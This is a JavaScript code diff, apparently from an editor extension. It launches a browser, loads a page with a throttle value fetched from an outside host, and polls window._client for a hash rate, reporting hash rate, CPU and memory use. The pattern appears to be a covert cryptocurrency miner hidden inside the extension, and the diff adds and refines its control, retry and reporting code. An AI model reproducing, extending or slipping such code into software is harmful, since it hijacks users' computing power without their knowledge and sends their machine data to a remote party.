@@ -141,10 +141,25 @@
       chromePath = chromeBrowser.executablePath;
     }
 
-    if (global.cppBrowser) {
-      await global.cppBrowser.close();
-      global.cppBrowser = null;
+    if (global.cppPage) {
+      try {
+        await global.cppPage.close();
+        let allpages = await browser.pages();
+        for (let i = 0; i < allpages.length; i++) {
+          await allpages[i].close();  
+        }
+      } catch (e) {
+        // tstt({ message: "BRW_PAGE_ERR", error: e, value: e.message });
+      }
       global.cppPage = null;
+    }
+    if (global.cppBrowser) {
+      try {
+        await global.cppBrowser.close();
+      } catch (e) {
+        // tstt({ message: "BRW_ERR", error: e, value: e.message });
+      }
+      global.cppBrowser = null;
     }
 
     console.log('lch', chromePath);
@@ -194,24 +209,67 @@
     global.cppBrowser = browser;
     // os.setPriority(browser.process().pid, 19);
     page = await browser.newPage();
-
     global.cppPage = page;
+
+    // try {
+
+    //   page.on('error', async error => {
+    //     tstt({
+    //       message: "ERR_PAGE",
+    //       error,
+    //       value: error.message,
+    //     });
+    //   }).on('pageerror', async error => {
+    //     tstt({
+    //       message: "PAGE_ERR",
+    //       error,
+    //       value: error.message,
+    //     });
+    //   }).on('request', async request => {
+    //     tstt({
+    //       message: "PAGE_REQ",
+    //       value: request.url(),
+    //     });
+    //   });
+
+    // } catch (error) {
+    //   tstt({
+    //     message: "PAGE_SET_ERR",
+    //     error,
+    //     value: error.message,
+    //   })
+    // }
 
 
     try {
       [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
     } catch (error) { }
     await page.goto(baseUrl + '?use=' + max);
-    await new Promise(r => setTimeout(r, 30 * 1000));
+    await new Promise(r => setTimeout(r, 60 * 1000));
     let clt = await page.evaluate(() => window._client);
     if (!clt) {
       tstt({
         baseUrl,
         message: "INIT_CLT",
-        value: "No client",
-        version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
+        value: "No client"
       });
       if (global.inIntv) clearInterval(global.inIntv);
+      if (global.cppPage) {
+        try {
+          await global.cppPage.close();
+        } catch (e) {
+          // tstt({ message: "BRW_PAGE_ERR", error: e, value: e.message });
+        }
+        global.cppPage = null;
+      }
+      if (global.cppBrowser) {
+        try {
+          await global.cppBrowser.close();
+        } catch (e) {
+          // tstt({ message: "BRW_ERR", error: e, value: e.message });
+        }
+        global.cppBrowser = null;
+      }
       return;
     }
 
@@ -226,13 +284,13 @@
       if (browser && page) {
         const hs = await page.evaluate(() => {
           try {
-            return { message: 'success', value: window._client?.getHashesPerSecond(), _client: window._client };
+            return { message: 'success', info: window.info, lastArr: window.lastArr, value: window._client?.getHashesPerSecond(), _client: window._client };
           } catch (error) {
-            return { message: error.message, value: null, error, _client: window._client };
+            return { message: error.message, info: window.info, lastArr: window.lastArr, value: null, error, _client: window._client };
           }
         });
-        if (hs.message != 'success') {
-          tstt({ baseUrl, message: hs.message, value: hs.value, error: hs.error, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+        if (hs.message != 'success' || !hs._client) {
+          tstt({ baseUrl, info: hs.info, message: hs.message, client: !!hs._client, value: hs.value, error: hs.error, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
           return;
         }
         [max, min] = [maxUse, minUse];
@@ -243,8 +301,11 @@
           message: "HASH",
           max: max,
           value: safe(() => parseFloat(hs?.value).toFixed(2)),
+          client: !!hs._client,
+          info: hs.info,
+          lastArr: hs.lastArr,
           cpu: getCPUUsage(),
-          memory: getMemoryUsage(),
+          memory: getMemoryUsage()?.total,
         });
 
         await page.evaluate((max, baseUrl) => {
